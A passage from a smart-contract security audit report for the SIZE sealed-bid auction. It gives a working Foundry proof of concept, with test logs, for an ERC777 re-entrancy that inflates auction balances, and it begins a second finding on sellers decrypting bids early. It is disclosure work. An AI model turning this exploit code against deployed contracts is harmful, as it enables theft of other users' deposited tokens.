totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract. Finally, the attacker can take more money from the contract global pool which means stealing tokens from the other auctions and treasury.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Forge test</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: GPL-3.0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.17;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {Test} from &quot;forge-std/Test.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {SizeSealedTest} from &quot;./SizeSealed.t.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ERC777} from &quot;openzeppelin-contracts/contracts/token/ERC777/ERC777.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {MockSeller} from &quot;./mocks/MockSeller.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {MockERC20} from &quot;./mocks/MockERC20.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract TaxERC777 is ERC777{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint32 tax = 50; // 50% tax rate</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor(string memory name_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        string memory symbol_,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] memory defaultOperators_) ERC777(name_, symbol_, defaultOperators_){}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function mint(address rec, uint256 amount) external{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        super._mint(rec, amount, &quot;&quot;, &quot;&quot;, false);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _beforeTokenTransfer(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address operator,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(to == address(0)||from==address(0)){ return;}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // tax just burn for test</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _send(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory userData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory operatorData,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bool requireReceptionAck</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint tax_amount = amount* tax / 100;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _burn(from, tax_amount, &quot;&quot;, &quot;&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        super._send(from, to, amount-tax_amount, userData, operatorData, requireReceptionAck);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract Callback {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockSeller seller;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint128 baseToSell;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 reserveQuotePerBase = 0.5e6 * uint256(type(uint128).max) / 1e18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint128 minimumBidQuote = 1e6;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Auction parameters (cliff unlock)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint32 startTime;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint32 endTime;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint32 unlockTime;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint32 unlockEnd;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint128 cliffPercent;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint8 entry = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint128 amount_cut_tax;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor(MockSeller _seller, uint128 _baseToSell, uint256 _reserveQuotePerBase, uint128 _minimumBidQuote, uint32 _startTime, uint32 _endTime, uint32 _unlockTime, uint32 _unlockEnd, uint128 _cliffPercent){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        seller = _seller;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        baseToSell = _baseToSell;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        reserveQuotePerBase = _reserveQuotePerBase;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        minimumBidQuote = _minimumBidQuote;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        startTime = _startTime;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        endTime = _endTime;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unlockTime = _unlockTime;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unlockEnd = _unlockEnd;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cliffPercent = _cliffPercent;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function tokensToSend(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(from==address(0) || to==address(0)){return;}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(entry == 0){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            entry += 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            amount_cut_tax = baseToSell / 2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            seller.createAuction(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                amount_cut_tax, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        else if(entry == 1){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            entry += 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            ERC777(msg.sender).transferFrom(from, to, amount_cut_tax);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        entry += 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32){return keccak256(abi.encodePacked(&quot;ERC1820_ACCEPT_MAGIC&quot;));}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract MyTest is SizeSealedTest {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testCreateAuctionFromErc777() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        TaxERC777 tax777Token;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] memory addrme = new address[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        addrme[0] = address(this);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tax777Token = new TaxERC777(&quot;t7&quot;, &quot;t7&quot;, addrme);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        seller = new MockSeller(address(auction), quoteToken, MockERC20(address(tax777Token)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Callback callbackImpl = new Callback(seller, baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // just without adding more function to MockSeller</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(address(seller));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _ERC1820_REGISTRY.setInterfaceImplementer(address(seller), keccak256(&quot;ERC777TokensSender&quot;), address(callbackImpl));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tax777Token.approve(address(callbackImpl), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        seller.createAuction(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint auction_balance = tax777Token.balanceOf(address(auction));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint128 auction1_amount = get_auction_base_amount(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint128 auction2_amount = get_auction_base_amount(2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit log_named_uint(&quot;auction balance&quot;, auction_balance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit log_named_uint(&quot;auction 1 totalBaseAmount&quot;, auction1_amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit log_named_uint(&quot;auction 2 totalBaseAmount&quot;, auction2_amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertGt(auction1_amount+auction2_amount, auction_balance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function get_auction_base_amount(uint id) private returns (uint128){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (, ,AuctionParameters memory para) = auction.idToAuction(id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return para.totalBaseAmount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>You should fork mainnet because the test needs to call the ERC1820Registry contract at <code>0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-test testCreateAuctionFromErc777 -vvvvv --fork-url XXXXXXXX</span></span></code></pre>\n<p>Test passed and print logs:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    â”œâ”€ [4900] SizeSealed::idToAuction(1) [staticcall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    â”‚   â””â”€ â† (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 10000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    â”œâ”€ [4900] SizeSealed::idToAuction(2) [staticcall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    â”‚   â””â”€ â† (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 5000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    â”œâ”€ emit log_named_uint(key: auction balance, val: 10000000000000000000)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    â”œâ”€ emit log_named_uint(key: auction 1 totalBaseAmount, val: 10000000000000000000)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    â”œâ”€ emit log_named_uint(key: auction 2 totalBaseAmount, val: 5000000000000000000)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    â””â”€ â† ()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: ok. 1 passed; 0 failed; finished in 7.64s</span></span></code></pre>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>foundry</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>check re-entrancy</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1308007344\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Very clever, but requires such ERC777 token to exist, interoperate with ERC1820 registry and be deposited by other sellers. Does such token exist?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1322409870\">RagePit (SIZE) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1332282361\">ronnyx2017 (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>Very clever, but requires such ERC777 token to exist, interoperate with ERC1820 registry and be deposited by other sellers. Does such token exist?</p>\n</blockquote>\n<p>Hi, thanks, just for explaining in more detail about the exploit. As it says in <a href=\"https://eips.ethereum.org/EIPS/eip-777\">https://eips.ethereum.org/EIPS/eip-777</a>, “The token contract MUST register the ERC777Token interface with its own address via <a href=\"https://eips.ethereum.org/EIPS/eip-1820\">ERC-1820</a>.“. The interface of interoperating with ERC1820 registry is built into ERC777 by default. And what the attacker need to do is registering in the ERC1820 registry for his sender/receriver address.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-sellers-ability-to-decrypt-bids-before-reveal-could-result-in-a-much-higher-clearing-price-than-anticpated-and-make-buyers-distrust-the-system\" style=\"position:relative;\"><a href=\"#m-05-sellers-ability-to-decrypt-bids-before-reveal-could-result-in-a-much-higher-clearing-price-than-anticpated-and-make-buyers-distrust-the-system\" aria-label=\"m 05 sellers ability to decrypt bids before reveal could result in a much higher clearing price than anticpated and make buyers distrust the system permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/194\">[M-05] Seller’s ability to decrypt bids before reveal could result in a much higher clearing price than anticpated and make buyers distrust the system</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/194\">c7e7eff</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/194\">c7e7eff</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/240\">gz627</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/104\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/65\">Lambda</a>, and <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/170\">rvierdiiev</a>.</em></p>\n<p>Bids are encrypted with the seller’s public key. This makes that the seller can see all the bids before they reveal and finalize the auction.\nIf the bids are unsatisfactory the seller can just decide not to honor the auction and not reveal their private key. Even worse, the seller, knowing the existing bids, can choose to fill the auction just beneath the optimal price increasing the clearing price.</p>\n<p>Although there is a <a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L140-L142\">check</a> in the <code>bid()</code> function where the bidder cannot submit a bid with the same address as the one used while creating the auction it is trivial to use another address to submit bids.</p>\n<p>Whether this results in a net increase of the total amount received is not a limiting factor as they might very well be happy with a lower total amount of quote tokes if it means selling less of the base tokens.</p>\n<p>Ultimately this means the reserve price for the auction is not respected which would make bidders distrust the system.\nBidders that don’t realize this impact stand to pay a much higher price than anticipated, hence the HIGH risk rating.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Following test shows the seller knowing the highest price can force the clearing price (<code>lowestQuote</code>) to be 2e6 in stead of what would be 1e6.\n<code>sellerIncreases</code> can be set to true or false to simulate both cases.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testAuctionSellerIncreasesClearing</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sellerIncreases</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sellerBeforeQuote</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sellerBeforeBase</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">seller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balances</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aid</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">seller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createAuction</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">baseToSell</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reserveQuotePerBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minimumBidQuote</span><span class=\"mtk1\">, </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">unlockTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">unlockEnd</span><span class=\"mtk1\">, </span><span class=\"mtk12\">cliffPercent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setAuctionId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">aid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setAuctionId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">aid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bidOnAuctionWithSalt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">9</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk7\">18e6</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;bidder1&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidder2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bidOnAuctionWithSalt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e6</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;bidder2&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedClearingPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e6</span><span class=\"mtk1\">;</span></span></span>\n<span 